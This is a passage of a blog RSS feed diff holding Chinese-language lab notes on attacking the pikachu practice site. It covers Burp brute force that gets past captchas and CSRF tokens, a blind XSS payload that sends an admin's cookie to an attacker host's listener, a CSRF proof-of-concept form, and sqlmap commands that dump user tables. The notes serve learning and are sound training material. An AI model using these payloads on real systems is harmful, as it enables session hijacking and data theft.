@@ -7,7 +7,235 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Sun, 25 Jan 2026 00:50:33 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 25 Jan 2026 17:28:35 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>1.25 更多暴破、XSS、CSRF和sql</title>
+        <link>https://www.retr0.xyz/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/</link>
+        <pubDate>Sun, 25 Jan 2026 17:28:35 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/</guid>
+        <description>&lt;h2 id=&#34;暴力破解进阶&#34;&gt;暴力破解进阶
+&lt;/h2&gt;&lt;p&gt;基础部分请见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.6 其他基础web漏洞介绍&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;四种模式的特点：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;sinper&lt;/strong&gt; 针对单一变量爆破&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;battering ram&lt;/strong&gt; 可以设置2个变量，paylaod同时赋值给2个变量&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;pitchfork&lt;/strong&gt; 两个变量分别设置payload，并且一一对应&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;cluster bomb&lt;/strong&gt; 交叉攻击&lt;/p&gt;
+&lt;p&gt;接下来打开pikachu靶场操作&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;验证码绕过on-server&#34;&gt;验证码绕过(on server)
+&lt;/h3&gt;&lt;p&gt;虽然服务端会生成验证码，但是我们可以利用验证码的生命时长来重复利用一个验证码。&lt;/p&gt;
+&lt;p&gt;所以直接抓包对密码部分进行字典爆破即可。&lt;/p&gt;
+&lt;h3 id=&#34;验证码绕过on-client&#34;&gt;验证码绕过(on client)
+&lt;/h3&gt;&lt;p&gt;客户端验证密码的防护能力约等于没有，所以哪怕你直接把数据包里&lt;code&gt;vscode=xxx&lt;/code&gt;的部分删除直接爆破密码也可以&lt;/p&gt;
+&lt;h3 id=&#34;token验证重点&#34;&gt;token验证（重点）
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;特点：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;每次提交，都会随机给你一个token值，一次性的，一旦token不同绝对不让你重复验证&lt;/li&gt;
+&lt;li&gt;可以防御重复提交&lt;/li&gt;
+&lt;li&gt;token属于无状态，可以在不同网站之间服务之间共享&lt;/li&gt;
+&lt;li&gt;token本身无法暴力破解&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但是查看页面源代码，可以看到&lt;code&gt;&amp;lt;input name=&amp;quot;token&amp;quot; value=&amp;quot;776496975bb416f396451548395&amp;quot; type=&amp;quot;hidden&amp;quot;&amp;gt;&lt;/code&gt;这一部分，所以我们可以想办法调用每次服务端发给我们的token来对密码进行爆破。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;burp抓包，发送到intruder模式为pitch fork，把密码，和token做标记&lt;/li&gt;
+&lt;li&gt;到payload中，payload1使用密码字典，&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;options&lt;/strong&gt;中线程选择1，下面的&lt;strong&gt;grep extract&lt;/strong&gt;（正则表达式），点&lt;strong&gt;add&lt;/strong&gt;，点&lt;strong&gt;fetch response&lt;/strong&gt;，搜索&lt;strong&gt;value&lt;/strong&gt;，把引号内的内容（也就是token）框起来，点OK&lt;/li&gt;
+&lt;li&gt;下面的&lt;strong&gt;redirections&lt;/strong&gt;，点&lt;strong&gt;always&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;回到payload，选2，选择&lt;strong&gt;Recurisive grep&lt;/strong&gt;，在下面的地方写上当前token的值&lt;/li&gt;
+&lt;li&gt;记得把&lt;strong&gt;payload encoding&lt;/strong&gt;的勾去掉，&lt;strong&gt;Start Attack&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;xss盲打&#34;&gt;XSS盲打
+&lt;/h2&gt;&lt;p&gt;打开pikachu靶场中Cross-Site Scripting(跨站攻击脚本)中的xss之盲打。&lt;/p&gt;
+&lt;p&gt;前台地址：&lt;a class=&#34;link&#34; href=&#34;http://localhost/vul/xss/xssblind/xss_blind.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://localhost/vul/xss/xssblind/xss_blind.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;后台地址：&lt;a class=&#34;link&#34; href=&#34;http://localhost/vul/xss/xssblind/admin_login.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://localhost/vul/xss/xssblind/admin_login.php&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;黑客端：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;打开nc ，监听自己的4444端口&lt;code&gt;nc -lvp 4444&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;构造一个XSS盲打的代码 &lt;strong&gt;（重点）&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;img&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;img&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;img&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://黑客IP:4444/cook?&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;escape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;address?&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;escape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该段代码能够在管理员打开后台时获取其cookie(身份认证信息)和后台地址并发送到黑客的4444端口。&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;将代码连同正常信息提交到留言板，并持续等待nc监听返回结果&lt;/li&gt;
+&lt;li&gt;获取到数据包，例如：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/cook?ant%5Buname%5D%3Dadmin%3B%20ant%5Bpw%5D%3D10470c3b4b1fed12c3baac014be15fac67c6e815%3B%20PHPSESSID%3Dge2lk6tk0k0ohc2p5ti73mf2d0&amp;amp;address?http%3A//localhost%3A81/vul/xss/xssblind/admin.php&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;127.0.0.1:4444&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;*/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;http://localhost:81/vul/xss/xssblind/admin.php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;DNT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;l&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;取第一行中有用部分将其中URL编码进行解码提高可读性，也可以使用这个Python脚本一键处理：&lt;a class=&#34;link&#34; href=&#34;https://makabaka11.github.io/blog-files/auto%20url-decode.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;auto url-decode.py&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;cook?ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ge2lk6tk0k0ohc2p5ti73mf2d0&amp;amp;address?http://localhost:81/vul/xss/xssblind/admin.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以从中分离出cookie为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=ge2lk6tk0k0ohc2p5ti73mf2d0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;后端网址为：&lt;code&gt;http://localhost:81/vul/xss/xssblind/admin.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;黑客访问这个后端网址时使用burp抓包，将刚才的cookie替换进去即可免密登录后台。&lt;/p&gt;
+&lt;h2 id=&#34;csrf跨站攻击&#34;&gt;CSRF跨站攻击
+&lt;/h2&gt;&lt;p&gt;CSRF通常用于在用户不知情的情况下修改其信息，例如您根据某个网站修改个人信息的页面的表单写一段代码并隐藏在您自己的网站中（例如点击“点我中奖”后会向原网站提交修改用户名的表单），使用一些手段诱导用户访问您的网站并点击按钮，好处是利用用户自己的cookie从而绕过身份验证。&lt;/p&gt;
+&lt;p&gt;不过现在您不用再手写隐藏表单，您可以在提交个人信息的界面用burp抓包，右键后点击 &lt;strong&gt;Engagement tools&lt;/strong&gt;&amp;ndash;**Generate CSRF Poc **一键生成后复制html代码到本地自行修改。&lt;/p&gt;
+&lt;p&gt;例如下面这段代码将会使得用户在点击按钮后性别被修改为直升机。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;script&amp;gt;history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;)&amp;lt;/script&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;form action=&amp;#34;http://localhost:81/vul/csrf/csrfget/csrf_get_edit.php&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;sex&amp;#34; value=&amp;#34;Helicopter&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;phonenum&amp;#34; value=&amp;#34;15988767673&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;add&amp;#34; value=&amp;#34;nba&amp;amp;#32;lakes&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;kobe&amp;amp;#64;pikachu&amp;amp;#46;com&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;      &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;点击中奖！&amp;#34; /&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;    &amp;lt;/form&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;  &amp;lt;/body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;sql注入自动化&#34;&gt;sql注入自动化
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;实际上就是各种类型sql注入的sqlmap教程&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;打开pikachu靶场至SQL-Inject部分。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;level-124&#34;&gt;Level 1、2、4
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost/vul/sqli/sqli_id.php&amp;#34;&lt;/span&gt; --data &lt;span class=&#34;s2&#34;&gt;&amp;#34;id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2&amp;#34;&lt;/span&gt; --current-db --batch --threads &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost/vul/sqli/sqli_id.php&amp;#34;&lt;/span&gt; --data &lt;span class=&#34;s2&#34;&gt;&amp;#34;id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2&amp;#34;&lt;/span&gt; -D pikachu --tables --batch --threads &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost/vul/sqli/sqli_id.php&amp;#34;&lt;/span&gt; --data &lt;span class=&#34;s2&#34;&gt;&amp;#34;id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2&amp;#34;&lt;/span&gt; -D pikachu -T users --columns --batch --threads &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python sqlmap.py -u &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://localhost/vul/sqli/sqli_id.php&amp;#34;&lt;/span&gt; --data &lt;span class=&#34;s2&#34;&gt;&amp;#34;id=1&amp;amp;submit=%E6%9F%A5%E8%AF%A2&amp;#34;&lt;/span&gt; -D pikachu -T users -C id,username,password --dump --batch --threads &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;搜索型注入特别&#34;&gt;搜索型注入（特别）
+&lt;/h3&gt;&lt;p&gt;搜索型注入在常规闭合基础上还会使用&lt;code&gt;%&lt;/code&gt;，要特别注意。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;猜测查询语句：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select * from table1 where username like &amp;#39;% x %&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;插入payload：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;select * from table1 where username like &amp;#39;% x%&amp;#39; union select 1,2,3 --+ %&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;insert注入&#34;&gt;insert注入
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
